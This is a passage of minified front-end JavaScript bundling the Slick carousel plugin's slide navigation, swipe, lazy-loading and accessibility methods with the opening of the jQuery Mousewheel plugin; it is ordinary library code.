    }, e.prototype.filterSlides = e.prototype.slickFilter = function (t) {
        var e = this;
        null !== t && (e.$slidesCache = e.$slides, e.unload(), e.$slideTrack.children(this.options.slide).detach(), e.$slidesCache.filter(t).appendTo(e.$slideTrack), e.reinit())
    }, e.prototype.getCurrent = e.prototype.slickCurrentSlide = function () {
        return this.currentSlide
    }, e.prototype.getDotCount = function () {
        var t = this, e = 0, i = 0, n = 0;
        if (!0 === t.options.infinite) for (; e < t.slideCount;) ++n, e = i + t.options.slidesToScroll, i += t.options.slidesToScroll <= t.options.slidesToShow ? t.options.slidesToScroll : t.options.slidesToShow; else if (!0 === t.options.centerMode) n = t.slideCount; else for (; e < t.slideCount;) ++n, e = i + t.options.slidesToScroll, i += t.options.slidesToScroll <= t.options.slidesToShow ? t.options.slidesToScroll : t.options.slidesToShow;
        return n - 1
    }, e.prototype.getLeft = function (t) {
        var e, i, n, o = this, s = 0;
        return o.slideOffset = 0, i = o.$slides.first().outerHeight(!0), !0 === o.options.infinite ? (o.slideCount > o.options.slidesToShow && (o.slideOffset = o.slideWidth * o.options.slidesToShow * -1, s = i * o.options.slidesToShow * -1), o.slideCount % o.options.slidesToScroll != 0 && t + o.options.slidesToScroll > o.slideCount && o.slideCount > o.options.slidesToShow && (t > o.slideCount ? (o.slideOffset = (o.options.slidesToShow - (t - o.slideCount)) * o.slideWidth * -1, s = (o.options.slidesToShow - (t - o.slideCount)) * i * -1) : (o.slideOffset = o.slideCount % o.options.slidesToScroll * o.slideWidth * -1, s = o.slideCount % o.options.slidesToScroll * i * -1))) : t + o.options.slidesToShow > o.slideCount && (o.slideOffset = (t + o.options.slidesToShow - o.slideCount) * o.slideWidth, s = (t + o.options.slidesToShow - o.slideCount) * i), o.slideCount <= o.options.slidesToShow && (o.slideOffset = 0, s = 0), !0 === o.options.centerMode && !0 === o.options.infinite ? o.slideOffset += o.slideWidth * Math.floor(o.options.slidesToShow / 2) - o.slideWidth : !0 === o.options.centerMode && (o.slideOffset = 0, o.slideOffset += o.slideWidth * Math.floor(o.options.slidesToShow / 2)), e = !1 === o.options.vertical ? t * o.slideWidth * -1 + o.slideOffset : t * i * -1 + s, !0 === o.options.variableWidth && (n = o.slideCount <= o.options.slidesToShow || !1 === o.options.infinite ? o.$slideTrack.children(".slick-slide").eq(t) : o.$slideTrack.children(".slick-slide").eq(t + o.options.slidesToShow), e = !0 === o.options.rtl ? n[0] ? -1 * (o.$slideTrack.width() - n[0].offsetLeft - n.width()) : 0 : n[0] ? -1 * n[0].offsetLeft : 0, !0 === o.options.centerMode && (n = o.slideCount <= o.options.slidesToShow || !1 === o.options.infinite ? o.$slideTrack.children(".slick-slide").eq(t) : o.$slideTrack.children(".slick-slide").eq(t + o.options.slidesToShow + 1), e = !0 === o.options.rtl ? n[0] ? -1 * (o.$slideTrack.width() - n[0].offsetLeft - n.width()) : 0 : n[0] ? -1 * n[0].offsetLeft : 0, e += (o.$list.width() - n.outerWidth()) / 2)), e
    }, e.prototype.getOption = e.prototype.slickGetOption = function (t) {
        return this.options[t]
    }, e.prototype.getNavigableIndexes = function () {
        var t, e = this, i = 0, n = 0, o = [];
        for (!1 === e.options.infinite ? t = e.slideCount : (i = -1 * e.options.slidesToScroll, n = -1 * e.options.slidesToScroll, t = 2 * e.slideCount); t > i;) o.push(i), i = n + e.options.slidesToScroll, n += e.options.slidesToScroll <= e.options.slidesToShow ? e.options.slidesToScroll : e.options.slidesToShow;
        return o
    }, e.prototype.getSlick = function () {
        return this
    }, e.prototype.getSlideCount = function () {
        var e, i, n = this;
        return i = !0 === n.options.centerMode ? n.slideWidth * Math.floor(n.options.slidesToShow / 2) : 0, !0 === n.options.swipeToSlide ? (n.$slideTrack.find(".slick-slide").each((function (o, s) {
            return s.offsetLeft - i + t(s).outerWidth() / 2 > -1 * n.swipeLeft ? (e = s, !1) : void 0
        })), Math.abs(t(e).attr("data-slick-index") - n.currentSlide) || 1) : n.options.slidesToScroll
    }, e.prototype.goTo = e.prototype.slickGoTo = function (t, e) {
        this.changeSlide({data: {message: "index", index: parseInt(t)}}, e)
    }, e.prototype.init = function (e) {
        var i = this;
        t(i.$slider).hasClass("slick-initialized") || (t(i.$slider).addClass("slick-initialized"), i.buildRows(), i.buildOut(), i.setProps(), i.startLoad(), i.loadSlider(), i.initializeEvents(), i.updateArrows(), i.updateDots()), e && i.$slider.trigger("init", [i]), !0 === i.options.accessibility && i.initADA()
    }, e.prototype.initArrowEvents = function () {
        var t = this;
        !0 === t.options.arrows && t.slideCount > t.options.slidesToShow && (t.$prevArrow.on("click.slick", {message: "previous"}, t.changeSlide), t.$nextArrow.on("click.slick", {message: "next"}, t.changeSlide))
    }, e.prototype.initDotEvents = function () {
        var e = this;
        !0 === e.options.dots && e.slideCount > e.options.slidesToShow && t("li", e.$dots).on("click.slick", {message: "index"}, e.changeSlide), !0 === e.options.dots && !0 === e.options.pauseOnDotsHover && !0 === e.options.autoplay && t("li", e.$dots).on("mouseenter.slick", t.proxy(e.setPaused, e, !0)).on("mouseleave.slick", t.proxy(e.setPaused, e, !1))
    }, e.prototype.initializeEvents = function () {
        var e = this;
        e.initArrowEvents(), e.initDotEvents(), e.$list.on("touchstart.slick mousedown.slick", {action: "start"}, e.swipeHandler), e.$list.on("touchmove.slick mousemove.slick", {action: "move"}, e.swipeHandler), e.$list.on("touchend.slick mouseup.slick", {action: "end"}, e.swipeHandler), e.$list.on("touchcancel.slick mouseleave.slick", {action: "end"}, e.swipeHandler), e.$list.on("click.slick", e.clickHandler), t(document).on(e.visibilityChange, t.proxy(e.visibility, e)), e.$list.on("mouseenter.slick", t.proxy(e.setPaused, e, !0)), e.$list.on("mouseleave.slick", t.proxy(e.setPaused, e, !1)), !0 === e.options.accessibility && e.$list.on("keydown.slick", e.keyHandler), !0 === e.options.focusOnSelect && t(e.$slideTrack).children().on("click.slick", e.selectHandler), t(window).on("orientationchange.slick.slick-" + e.instanceUid, t.proxy(e.orientationChange, e)), t(window).on("resize.slick.slick-" + e.instanceUid, t.proxy(e.resize, e)), t("[draggable!=true]", e.$slideTrack).on("dragstart", e.preventDefault), t(window).on("load.slick.slick-" + e.instanceUid, e.setPosition), t(document).on("ready.slick.slick-" + e.instanceUid, e.setPosition)
    }, e.prototype.initUI = function () {
        var t = this;
        !0 === t.options.arrows && t.slideCount > t.options.slidesToShow && (t.$prevArrow.show(), t.$nextArrow.show()), !0 === t.options.dots && t.slideCount > t.options.slidesToShow && t.$dots.show(), !0 === t.options.autoplay && t.autoPlay()
    }, e.prototype.keyHandler = function (t) {
        var e = this;
        t.target.tagName.match("TEXTAREA|INPUT|SELECT") || (37 === t.keyCode && !0 === e.options.accessibility ? e.changeSlide({data: {message: "previous"}}) : 39 === t.keyCode && !0 === e.options.accessibility && e.changeSlide({data: {message: "next"}}))
    }, e.prototype.lazyLoad = function () {
        function e(e) {
            t("img[data-lazy]", e).each((function () {
                var e = t(this), i = t(this).attr("data-lazy"), n = document.createElement("img");
                n.onload = function () {
                    e.animate({opacity: 0}, 100, (function () {
                        e.attr("src", i).animate({opacity: 1}, 200, (function () {
                            e.removeAttr("data-lazy").removeClass("slick-loading")
                        }))
                    }))
                }, n.src = i
            }))
        }

        var i, n, o = this;
        !0 === o.options.centerMode ? !0 === o.options.infinite ? n = (i = o.currentSlide + (o.options.slidesToShow / 2 + 1)) + o.options.slidesToShow + 2 : (i = Math.max(0, o.currentSlide - (o.options.slidesToShow / 2 + 1)), n = o.options.slidesToShow / 2 + 1 + 2 + o.currentSlide) : (n = (i = o.options.infinite ? o.options.slidesToShow + o.currentSlide : o.currentSlide) + o.options.slidesToShow, !0 === o.options.fade && (i > 0 && i--, n <= o.slideCount && n++)), e(o.$slider.find(".slick-slide").slice(i, n)), o.slideCount <= o.options.slidesToShow ? e(o.$slider.find(".slick-slide")) : o.currentSlide >= o.slideCount - o.options.slidesToShow ? e(o.$slider.find(".slick-cloned").slice(0, o.options.slidesToShow)) : 0 === o.currentSlide && e(o.$slider.find(".slick-cloned").slice(-1 * o.options.slidesToShow))
    }, e.prototype.loadSlider = function () {
        var t = this;
        t.setPosition(), t.$slideTrack.css({opacity: 1}), t.$slider.removeClass("slick-loading"), t.initUI(), "progressive" === t.options.lazyLoad && t.progressiveLazyLoad()
    }, e.prototype.next = e.prototype.slickNext = function () {
        this.changeSlide({data: {message: "next"}})
    }, e.prototype.orientationChange = function () {
        this.checkResponsive(), this.setPosition()
    }, e.prototype.pause = e.prototype.slickPause = function () {
        this.autoPlayClear(), this.paused = !0
    }, e.prototype.play = e.prototype.slickPlay = function () {
        this.paused = !1, this.autoPlay()
    }, e.prototype.postSlide = function (t) {
        var e = this;
        e.$slider.trigger("afterChange", [e, t]), e.animating = !1, e.setPosition(), e.swipeLeft = null, !0 === e.options.autoplay && !1 === e.paused && e.autoPlay(), !0 === e.options.accessibility && e.initADA()
    }, e.prototype.prev = e.prototype.slickPrev = function () {
        this.changeSlide({data: {message: "previous"}})
    }, e.prototype.preventDefault = function (t) {
        t.preventDefault()
    }, e.prototype.progressiveLazyLoad = function () {
        var e, i = this;
        t("img[data-lazy]", i.$slider).length > 0 && ((e = t("img[data-lazy]", i.$slider).first()).attr("src", null), e.attr("src", e.attr("data-lazy")).removeClass("slick-loading").load((function () {
            e.removeAttr("data-lazy"), i.progressiveLazyLoad(), !0 === i.options.adaptiveHeight && i.setPosition()
        })).error((function () {
            e.removeAttr("data-lazy"), i.progressiveLazyLoad()
        })))
    }, e.prototype.refresh = function (e) {
        var i, n, o = this;
        n = o.slideCount - o.options.slidesToShow, o.options.infinite || (o.slideCount <= o.options.slidesToShow ? o.currentSlide = 0 : o.currentSlide > n && (o.currentSlide = n)), i = o.currentSlide, o.destroy(!0), t.extend(o, o.initials, {currentSlide: i}), o.init(), e || o.changeSlide({
            data: {
                message: "index",
                index: i
            }
        }, !1)
    }, e.prototype.registerBreakpoints = function () {
        var e, i, n, o = this, s = o.options.responsive || null;
        if ("array" === t.type(s) && s.length) {
            for (e in o.respondTo = o.options.respondTo || "window", s) if (n = o.breakpoints.length - 1, i = s[e].breakpoint, s.hasOwnProperty(e)) {
                for (; n >= 0;) o.breakpoints[n] && o.breakpoints[n] === i && o.breakpoints.splice(n, 1), n--;
                o.breakpoints.push(i), o.breakpointSettings[i] = s[e].settings
            }
            o.breakpoints.sort((function (t, e) {
                return o.options.mobileFirst ? t - e : e - t
            }))
        }
    }, e.prototype.reinit = function () {
        var e = this;
        e.$slides = e.$slideTrack.children(e.options.slide).addClass("slick-slide"), e.slideCount = e.$slides.length, e.currentSlide >= e.slideCount && 0 !== e.currentSlide && (e.currentSlide = e.currentSlide - e.options.slidesToScroll), e.slideCount <= e.options.slidesToShow && (e.currentSlide = 0), e.registerBreakpoints(), e.setProps(), e.setupInfinite(), e.buildArrows(), e.updateArrows(), e.initArrowEvents(), e.buildDots(), e.updateDots(), e.initDotEvents(), e.checkResponsive(!1, !0), !0 === e.options.focusOnSelect && t(e.$slideTrack).children().on("click.slick", e.selectHandler), e.setSlideClasses(0), e.setPosition(), e.$slider.trigger("reInit", [e]), !0 === e.options.autoplay && e.focusHandler()
    }, e.prototype.resize = function () {
        var e = this;
        t(window).width() !== e.windowWidth && (clearTimeout(e.windowDelay), e.windowDelay = window.setTimeout((function () {
            e.windowWidth = t(window).width(), e.checkResponsive(), e.unslicked || e.setPosition()
        }), 50))
    }, e.prototype.removeSlide = e.prototype.slickRemove = function (t, e, i) {
        var n = this;
        return "boolean" == typeof t ? t = !0 === (e = t) ? 0 : n.slideCount - 1 : t = !0 === e ? --t : t, !(n.slideCount < 1 || 0 > t || t > n.slideCount - 1) && (n.unload(), !0 === i ? n.$slideTrack.children().remove() : n.$slideTrack.children(this.options.slide).eq(t).remove(), n.$slides = n.$slideTrack.children(this.options.slide), n.$slideTrack.children(this.options.slide).detach(), n.$slideTrack.append(n.$slides), n.$slidesCache = n.$slides, void n.reinit())
    }, e.prototype.setCSS = function (t) {
        var e, i, n = this, o = {};
        !0 === n.options.rtl && (t = -t), e = "left" == n.positionProp ? Math.ceil(t) + "px" : "0px", i = "top" == n.positionProp ? Math.ceil(t) + "px" : "0px", o[n.positionProp] = t, !1 === n.transformsEnabled ? n.$slideTrack.css(o) : (o = {}, !1 === n.cssTransitions ? (o[n.animType] = "translate(" + e + ", " + i + ")", n.$slideTrack.css(o)) : (o[n.animType] = "translate3d(" + e + ", " + i + ", 0px)", n.$slideTrack.css(o)))
    }, e.prototype.setDimensions = function () {
        var t = this;
        !1 === t.options.vertical ? !0 === t.options.centerMode && t.$list.css({padding: "0px " + t.options.centerPadding}) : (t.$list.height(t.$slides.first().outerHeight(!0) * t.options.slidesToShow), !0 === t.options.centerMode && t.$list.css({padding: t.options.centerPadding + " 0px"})), t.listWidth = t.$list.width(), t.listHeight = t.$list.height(), !1 === t.options.vertical && !1 === t.options.variableWidth ? (t.slideWidth = Math.ceil(t.listWidth / t.options.slidesToShow), t.$slideTrack.width(Math.ceil(t.slideWidth * t.$slideTrack.children(".slick-slide").length))) : !0 === t.options.variableWidth ? t.$slideTrack.width(5e3 * t.slideCount) : (t.slideWidth = Math.ceil(t.listWidth), t.$slideTrack.height(Math.ceil(t.$slides.first().outerHeight(!0) * t.$slideTrack.children(".slick-slide").length)));
        var e = t.$slides.first().outerWidth(!0) - t.$slides.first().width();
        !1 === t.options.variableWidth && t.$slideTrack.children(".slick-slide").width(t.slideWidth - e)
    }, e.prototype.setFade = function () {
        var e, i = this;
        i.$slides.each((function (n, o) {
            e = i.slideWidth * n * -1, !0 === i.options.rtl ? t(o).css({
                position: "relative",
                right: e,
                top: 0,
                zIndex: i.options.zIndex - 2,
                opacity: 0
            }) : t(o).css({position: "relative", left: e, top: 0, zIndex: i.options.zIndex - 2, opacity: 0})
        })), i.$slides.eq(i.currentSlide).css({zIndex: i.options.zIndex - 1, opacity: 1})
    }, e.prototype.setHeight = function () {
        var t = this;
        if (1 === t.options.slidesToShow && !0 === t.options.adaptiveHeight && !1 === t.options.vertical) {
            var e = t.$slides.eq(t.currentSlide).outerHeight(!0);
            t.$list.css("height", e)
        }
    }, e.prototype.setOption = e.prototype.slickSetOption = function (e, i, n) {
        var o, s, r = this;
        if ("responsive" === e && "array" === t.type(i)) for (s in i) if ("array" !== t.type(r.options.responsive)) r.options.responsive = [i[s]]; else {
            for (o = r.options.responsive.length - 1; o >= 0;) r.options.responsive[o].breakpoint === i[s].breakpoint && r.options.responsive.splice(o, 1), o--;
            r.options.responsive.push(i[s])
        } else r.options[e] = i;
        !0 === n && (r.unload(), r.reinit())
    }, e.prototype.setPosition = function () {
        var t = this;
        t.setDimensions(), t.setHeight(), !1 === t.options.fade ? t.setCSS(t.getLeft(t.currentSlide)) : t.setFade(), t.$slider.trigger("setPosition", [t])
    }, e.prototype.setProps = function () {
        var t = this, e = document.body.style;
        t.positionProp = !0 === t.options.vertical ? "top" : "left", "top" === t.positionProp ? t.$slider.addClass("slick-vertical") : t.$slider.removeClass("slick-vertical"), (void 0 !== e.WebkitTransition || void 0 !== e.MozTransition || void 0 !== e.msTransition) && !0 === t.options.useCSS && (t.cssTransitions = !0), t.options.fade && ("number" == typeof t.options.zIndex ? t.options.zIndex < 3 && (t.options.zIndex = 3) : t.options.zIndex = t.defaults.zIndex), void 0 !== e.OTransform && (t.animType = "OTransform", t.transformType = "-o-transform", t.transitionType = "OTransition", void 0 === e.perspectiveProperty && void 0 === e.webkitPerspective && (t.animType = !1)), void 0 !== e.MozTransform && (t.animType = "MozTransform", t.transformType = "-moz-transform", t.transitionType = "MozTransition", void 0 === e.perspectiveProperty && void 0 === e.MozPerspective && (t.animType = !1)), void 0 !== e.webkitTransform && (t.animType = "webkitTransform", t.transformType = "-webkit-transform", t.transitionType = "webkitTransition", void 0 === e.perspectiveProperty && void 0 === e.webkitPerspective && (t.animType = !1)), void 0 !== e.msTransform && (t.animType = "msTransform", t.transformType = "-ms-transform", t.transitionType = "msTransition", void 0 === e.msTransform && (t.animType = !1)), void 0 !== e.transform && !1 !== t.animType && (t.animType = "transform", t.transformType = "transform", t.transitionType = "transition"), t.transformsEnabled = t.options.useTransform && null !== t.animType && !1 !== t.animType
    }, e.prototype.setSlideClasses = function (t) {
        var e, i, n, o, s = this;
        i = s.$slider.find(".slick-slide").removeClass("slick-active slick-center slick-current").attr("aria-hidden", "true"), s.$slides.eq(t).addClass("slick-current"), !0 === s.options.centerMode ? (e = Math.floor(s.options.slidesToShow / 2), !0 === s.options.infinite && (t >= e && t <= s.slideCount - 1 - e ? s.$slides.slice(t - e, t + e + 1).addClass("slick-active").attr("aria-hidden", "false") : (n = s.options.slidesToShow + t, i.slice(n - e + 1, n + e + 2).addClass("slick-active").attr("aria-hidden", "false")), 0 === t ? i.eq(i.length - 1 - s.options.slidesToShow).addClass("slick-center") : t === s.slideCount - 1 && i.eq(s.options.slidesToShow).addClass("slick-center")), s.$slides.eq(t).addClass("slick-center")) : t >= 0 && t <= s.slideCount - s.options.slidesToShow ? s.$slides.slice(t, t + s.options.slidesToShow).addClass("slick-active").attr("aria-hidden", "false") : i.length <= s.options.slidesToShow ? i.addClass("slick-active").attr("aria-hidden", "false") : (o = s.slideCount % s.options.slidesToShow, n = !0 === s.options.infinite ? s.options.slidesToShow + t : t, s.options.slidesToShow == s.options.slidesToScroll && s.slideCount - t < s.options.slidesToShow ? i.slice(n - (s.options.slidesToShow - o), n + o).addClass("slick-active").attr("aria-hidden", "false") : i.slice(n, n + s.options.slidesToShow).addClass("slick-active").attr("aria-hidden", "false")), "ondemand" === s.options.lazyLoad && s.lazyLoad()
    }, e.prototype.setupInfinite = function () {
        var e, i, n, o = this;
        if (!0 === o.options.fade && (o.options.centerMode = !1), !0 === o.options.infinite && !1 === o.options.fade && (i = null, o.slideCount > o.options.slidesToShow)) {
            for (n = !0 === o.options.centerMode ? o.options.slidesToShow + 1 : o.options.slidesToShow, e = o.slideCount; e > o.slideCount - n; e -= 1) i = e - 1, t(o.$slides[i]).clone(!0).attr("id", "").attr("data-slick-index", i - o.slideCount).prependTo(o.$slideTrack).addClass("slick-cloned");
            for (e = 0; n > e; e += 1) i = e, t(o.$slides[i]).clone(!0).attr("id", "").attr("data-slick-index", i + o.slideCount).appendTo(o.$slideTrack).addClass("slick-cloned");
            o.$slideTrack.find(".slick-cloned").find("[id]").each((function () {
                t(this).attr("id", "")
            }))
        }
    }, e.prototype.setPaused = function (t) {
        var e = this;
        !0 === e.options.autoplay && !0 === e.options.pauseOnHover && (e.paused = t, t ? e.autoPlayClear() : e.autoPlay())
    }, e.prototype.selectHandler = function (e) {
        var i = this, n = t(e.target).is(".slick-slide") ? t(e.target) : t(e.target).parents(".slick-slide"),
            o = parseInt(n.attr("data-slick-index"));
        return o || (o = 0), i.slideCount <= i.options.slidesToShow ? (i.setSlideClasses(o), void i.asNavFor(o)) : void i.slideHandler(o)
    }, e.prototype.slideHandler = function (t, e, i) {
        var n, o, s, r, a = null, l = this;
        return e = e || !1, !0 === l.animating && !0 === l.options.waitForAnimate || !0 === l.options.fade && l.currentSlide === t || l.slideCount <= l.options.slidesToShow ? void 0 : (!1 === e && l.asNavFor(t), n = t, a = l.getLeft(n), r = l.getLeft(l.currentSlide), l.currentLeft = null === l.swipeLeft ? r : l.swipeLeft, !1 === l.options.infinite && !1 === l.options.centerMode && (0 > t || t > l.getDotCount() * l.options.slidesToScroll) || !1 === l.options.infinite && !0 === l.options.centerMode && (0 > t || t > l.slideCount - l.options.slidesToScroll) ? void (!1 === l.options.fade && (n = l.currentSlide, !0 !== i ? l.animateSlide(r, (function () {
            l.postSlide(n)
        })) : l.postSlide(n))) : (!0 === l.options.autoplay && clearInterval(l.autoPlayTimer), o = 0 > n ? l.slideCount % l.options.slidesToScroll != 0 ? l.slideCount - l.slideCount % l.options.slidesToScroll : l.slideCount + n : n >= l.slideCount ? l.slideCount % l.options.slidesToScroll != 0 ? 0 : n - l.slideCount : n, l.animating = !0, l.$slider.trigger("beforeChange", [l, l.currentSlide, o]), s = l.currentSlide, l.currentSlide = o, l.setSlideClasses(l.currentSlide), l.updateDots(), l.updateArrows(), !0 === l.options.fade ? (!0 !== i ? (l.fadeSlideOut(s), l.fadeSlide(o, (function () {
            l.postSlide(o)
        }))) : l.postSlide(o), void l.animateHeight()) : void (!0 !== i ? l.animateSlide(a, (function () {
            l.postSlide(o)
        })) : l.postSlide(o))))
    }, e.prototype.startLoad = function () {
        var t = this;
        !0 === t.options.arrows && t.slideCount > t.options.slidesToShow && (t.$prevArrow.hide(), t.$nextArrow.hide()), !0 === t.options.dots && t.slideCount > t.options.slidesToShow && t.$dots.hide(), t.$slider.addClass("slick-loading")
    }, e.prototype.swipeDirection = function () {
        var t, e, i, n, o = this;
        return t = o.touchObject.startX - o.touchObject.curX, e = o.touchObject.startY - o.touchObject.curY, i = Math.atan2(e, t), 0 > (n = Math.round(180 * i / Math.PI)) && (n = 360 - Math.abs(n)), 45 >= n && n >= 0 || 360 >= n && n >= 315 ? !1 === o.options.rtl ? "left" : "right" : n >= 135 && 225 >= n ? !1 === o.options.rtl ? "right" : "left" : !0 === o.options.verticalSwiping ? n >= 35 && 135 >= n ? "left" : "right" : "vertical"
    }, e.prototype.swipeEnd = function (t) {
        var e, i = this;
        if (i.dragging = !1, i.shouldClick = !(i.touchObject.swipeLength > 10), void 0 === i.touchObject.curX) return !1;
        if (!0 === i.touchObject.edgeHit && i.$slider.trigger("edge", [i, i.swipeDirection()]), i.touchObject.swipeLength >= i.touchObject.minSwipe) switch (i.swipeDirection()) {
            case"left":
                e = i.options.swipeToSlide ? i.checkNavigable(i.currentSlide + i.getSlideCount()) : i.currentSlide + i.getSlideCount(), i.slideHandler(e), i.currentDirection = 0, i.touchObject = {}, i.$slider.trigger("swipe", [i, "left"]);
                break;
            case"right":
                e = i.options.swipeToSlide ? i.checkNavigable(i.currentSlide - i.getSlideCount()) : i.currentSlide - i.getSlideCount(), i.slideHandler(e), i.currentDirection = 1, i.touchObject = {}, i.$slider.trigger("swipe", [i, "right"])
        } else i.touchObject.startX !== i.touchObject.curX && (i.slideHandler(i.currentSlide), i.touchObject = {})
    }, e.prototype.swipeHandler = function (t) {
        var e = this;
        if (!(!1 === e.options.swipe || "ontouchend" in document && !1 === e.options.swipe || !1 === e.options.draggable && -1 !== t.type.indexOf("mouse"))) switch (e.touchObject.fingerCount = t.originalEvent && void 0 !== t.originalEvent.touches ? t.originalEvent.touches.length : 1, e.touchObject.minSwipe = e.listWidth / e.options.touchThreshold, !0 === e.options.verticalSwiping && (e.touchObject.minSwipe = e.listHeight / e.options.touchThreshold), t.data.action) {
            case"start":
                e.swipeStart(t);
                break;
            case"move":
                e.swipeMove(t);
                break;
            case"end":
                e.swipeEnd(t)
        }
    }, e.prototype.swipeMove = function (t) {
        var e, i, n, o, s, r = this;
        return s = void 0 !== t.originalEvent ? t.originalEvent.touches : null, !(!r.dragging || s && 1 !== s.length) && (e = r.getLeft(r.currentSlide), r.touchObject.curX = void 0 !== s ? s[0].pageX : t.clientX, r.touchObject.curY = void 0 !== s ? s[0].pageY : t.clientY, r.touchObject.swipeLength = Math.round(Math.sqrt(Math.pow(r.touchObject.curX - r.touchObject.startX, 2))), !0 === r.options.verticalSwiping && (r.touchObject.swipeLength = Math.round(Math.sqrt(Math.pow(r.touchObject.curY - r.touchObject.startY, 2)))), "vertical" !== (i = r.swipeDirection()) ? (void 0 !== t.originalEvent && r.touchObject.swipeLength > 4 && t.preventDefault(), o = (!1 === r.options.rtl ? 1 : -1) * (r.touchObject.curX > r.touchObject.startX ? 1 : -1), !0 === r.options.verticalSwiping && (o = r.touchObject.curY > r.touchObject.startY ? 1 : -1), n = r.touchObject.swipeLength, r.touchObject.edgeHit = !1, !1 === r.options.infinite && (0 === r.currentSlide && "right" === i || r.currentSlide >= r.getDotCount() && "left" === i) && (n = r.touchObject.swipeLength * r.options.edgeFriction, r.touchObject.edgeHit = !0), !1 === r.options.vertical ? r.swipeLeft = e + n * o : r.swipeLeft = e + n * (r.$list.height() / r.listWidth) * o, !0 === r.options.verticalSwiping && (r.swipeLeft = e + n * o), !0 !== r.options.fade && !1 !== r.options.touchMove && (!0 === r.animating ? (r.swipeLeft = null, !1) : void r.setCSS(r.swipeLeft))) : void 0)
    }, e.prototype.swipeStart = function (t) {
        var e, i = this;
        return 1 !== i.touchObject.fingerCount || i.slideCount <= i.options.slidesToShow ? (i.touchObject = {}, !1) : (void 0 !== t.originalEvent && void 0 !== t.originalEvent.touches && (e = t.originalEvent.touches[0]), i.touchObject.startX = i.touchObject.curX = void 0 !== e ? e.pageX : t.clientX, i.touchObject.startY = i.touchObject.curY = void 0 !== e ? e.pageY : t.clientY, void (i.dragging = !0))
    }, e.prototype.unfilterSlides = e.prototype.slickUnfilter = function () {
        var t = this;
        null !== t.$slidesCache && (t.unload(), t.$slideTrack.children(this.options.slide).detach(), t.$slidesCache.appendTo(t.$slideTrack), t.reinit())
    }, e.prototype.unload = function () {
        var e = this;
        t(".slick-cloned", e.$slider).remove(), e.$dots && e.$dots.remove(), e.$prevArrow && e.htmlExpr.test(e.options.prevArrow) && e.$prevArrow.remove(), e.$nextArrow && e.htmlExpr.test(e.options.nextArrow) && e.$nextArrow.remove(), e.$slides.removeClass("slick-slide slick-active slick-visible slick-current").attr("aria-hidden", "true").css("width", "")
    }, e.prototype.unslick = function (t) {
        var e = this;
        e.$slider.trigger("unslick", [e, t]), e.destroy()
    }, e.prototype.updateArrows = function () {
        var t = this;
        Math.floor(t.options.slidesToShow / 2), !0 === t.options.arrows && t.slideCount > t.options.slidesToShow && !t.options.infinite && (t.$prevArrow.removeClass("slick-disabled").attr("aria-disabled", "false"), t.$nextArrow.removeClass("slick-disabled").attr("aria-disabled", "false"), 0 === t.currentSlide ? (t.$prevArrow.addClass("slick-disabled").attr("aria-disabled", "true"), t.$nextArrow.removeClass("slick-disabled").attr("aria-disabled", "false")) : (t.currentSlide >= t.slideCount - t.options.slidesToShow && !1 === t.options.centerMode || t.currentSlide >= t.slideCount - 1 && !0 === t.options.centerMode) && (t.$nextArrow.addClass("slick-disabled").attr("aria-disabled", "true"), t.$prevArrow.removeClass("slick-disabled").attr("aria-disabled", "false")))
    }, e.prototype.updateDots = function () {
        var t = this;
        null !== t.$dots && (t.$dots.find("li").removeClass("slick-active").attr("aria-hidden", "true"), t.$dots.find("li").eq(Math.floor(t.currentSlide / t.options.slidesToScroll)).addClass("slick-active").attr("aria-hidden", "false"))
    }, e.prototype.visibility = function () {
        var t = this;
        document[t.hidden] ? (t.paused = !0, t.autoPlayClear()) : !0 === t.options.autoplay && (t.paused = !1, t.autoPlay())
    }, e.prototype.initADA = function () {
        var e = this;
        e.$slides.add(e.$slideTrack.find(".slick-cloned")).attr({
            "aria-hidden": "true",
            tabindex: "-1"
        }).find("a, input, button, select").attr({tabindex: "-1"}), e.$slideTrack.attr("role", "listbox"), e.$slides.not(e.$slideTrack.find(".slick-cloned")).each((function (i) {
            t(this).attr({role: "option", "aria-describedby": "slick-slide" + e.instanceUid + i})
        })), null !== e.$dots && e.$dots.attr("role", "tablist").find("li").each((function (i) {
            t(this).attr({
                role: "presentation",
                "aria-selected": "false",
                "aria-controls": "navigation" + e.instanceUid + i,
                id: "slick-slide" + e.instanceUid + i
            })
        })).first().attr("aria-selected", "true").end().find("button").attr("role", "button").end().closest("div").attr("role", "toolbar"), e.activateADA()
    }, e.prototype.activateADA = function () {
        this.$slideTrack.find(".slick-active").attr({"aria-hidden": "false"}).find("a, input, button, select").attr({tabindex: "0"})
    }, e.prototype.focusHandler = function () {
        var e = this;
        e.$slider.on("focus.slick blur.slick", "*", (function (i) {
            i.stopImmediatePropagation();
            var n = t(this);
            setTimeout((function () {
                e.isPlay && (n.is(":focus") ? (e.autoPlayClear(), e.paused = !0) : (e.paused = !1, e.autoPlay()))
            }), 0)
        }))
    }, t.fn.slick = function () {
        var t, i, n = this, o = arguments[0], s = Array.prototype.slice.call(arguments, 1), r = n.length;
        for (t = 0; r > t; t++) if ("object" == typeof o || void 0 === o ? n[t].slick = new e(n[t], o) : i = n[t].slick[o].apply(n[t].slick, s), void 0 !== i) return i;
        return n
    }
})), function (t) {
    "function" == typeof define && define.amd ? define(["jquery"], t) : "object" == typeof exports ? module.exports = t : t(jQuery)
}((function (t) {
    function e(e) {
        var r = e || window.event, a = l.call(arguments, 1), c = 0, u = 0, h = 0, p = 0, f = 0, g = 0;
        if ((e = t.event.fix(r)).type = "mousewheel", "detail" in r && (h = -1 * r.detail), "wheelDelta" in r && (h = r.wheelDelta), "wheelDeltaY" in r && (h = r.wheelDeltaY), "wheelDeltaX" in r && (u = -1 * r.wheelDeltaX), "axis" in r && r.axis === r.HORIZONTAL_AXIS && (u = -1 * h, h = 0), c = 0 === h ? u : h, "deltaY" in r && (c = h = -1 * r.deltaY), "deltaX" in r && (u = r.deltaX, 0 === h && (c = -1 * u)), 0 !== h || 0 !== u) {
            if (1 === r.deltaMode) {
                var m = t.data(this, "mousewheel-line-height");
                c *= m, h *= m, u *= m
            } else if (2 === r.deltaMode) {
                var v = t.data(this, "mousewheel-page-height");
                c *= v, h *= v, u *= v
            }
            if (p = Math.max(Math.abs(h), Math.abs(u)), (!s || s > p) && (s = p, n(r, p) && (s /= 40)), n(r, p) && (c /= 40, u /= 40, h /= 40), c = Math[c >= 1 ? "floor" : "ceil"](c / s), u = Math[u >= 1 ? "floor" : "ceil"](u / s), h = Math[h >= 1 ? "floor" : "ceil"](h / s), d.settings.normalizeOffset && this.getBoundingClientRect) {
                var y = this.getBoundingClientRect();
                f = e.clientX - y.left, g = e.clientY - y.top
            }
